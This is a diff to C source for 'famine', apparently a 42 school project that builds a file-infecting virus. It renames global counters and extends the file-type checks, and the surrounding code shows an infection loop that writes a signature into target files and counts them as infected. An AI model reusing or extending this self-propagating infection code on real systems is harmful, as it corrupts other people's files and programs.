@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/24 21:11:05 by mgama             #+#    #+#             */
-/*   Updated: 2025/06/13 12:08:11 by mgama            ###   ########.fr       */
+/*   Updated: 2025/06/14 21:10:58 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,8 +19,8 @@
 
 struct s_famine g_famine;
 int g_exit = 0;
-size_t count = 0;
-size_t infected = 0;
+size_t g_count = 0;
+size_t g_infected = 0;
 
 const struct s_famine_magics magics[] = {
 	// EXECUTABLES
@@ -171,16 +171,21 @@ int famine(char *target, char *parent)
 		return (0);
 
 	/**
-	 * Prevent from following file symlink
+	 * Prevent from following file symlink and opening directories, character devices,
+	 * block devices, pipes, and sockets.
 	 */
-	if (S_ISLNK(statbuf.st_mode))
+	if (S_ISLNK(statbuf.st_mode) ||  // symbolic links
+		S_ISDIR(statbuf.st_mode) ||  // directories
+		S_ISCHR(statbuf.st_mode) ||  // character devices (e.g., /dev/null)
+		S_ISBLK(statbuf.st_mode) ||  // block devices (e.g., /dev/sda)
+		S_ISFIFO(statbuf.st_mode) || // named pipes
+		S_ISSOCK(statbuf.st_mode))   // sockets
+	{
 		return (0);
+	}
 
-	if (S_ISDIR(statbuf.st_mode))
-		return (0);
-
-	ft_verbose("%d: Checking %s%s%s\n", count, B_YELLOW, full_path, RESET);
-	count++;
+	ft_verbose("%d: Checking %s%s%s\n", g_count, B_YELLOW, full_path, RESET);
+	g_count++;
 
 #ifdef __APPLE__
 	if (is_icloud_file(full_path))
@@ -234,7 +239,7 @@ int famine(char *target, char *parent)
 	lseek(fd, pos, SEEK_SET);
 	write(fd, signature, sizeof(signature));
 	close(fd);
-	infected++;
+	g_infected++;
 	return (1);
 }
 
@@ -479,8 +484,8 @@ int main(int argc, char **argv, char *const * envp)
 
 	do
 	{
-		count = 0;
-		infected = 0;
+		g_count = 0;
+		g_infected = 0;
 		ft_verbose("New infection cycle\n");
 		if (option & F_CUSTOM)
 		{
@@ -491,8 +496,8 @@ int main(int argc, char **argv, char *const * envp)
 			custom_target(FM_TARGET, NULL, option & F_RECURSIVE, recursive_depth);
 		}
 
-		ft_verbose("\n%d files checked !\n", count);
-		ft_verbose("%d files infected !\n", infected);
+		ft_verbose("\n%d files checked !\n", g_count);
+		ft_verbose("%d files infected !\n", g_infected);
 
 		if (option & F_ONCE)
 			break;
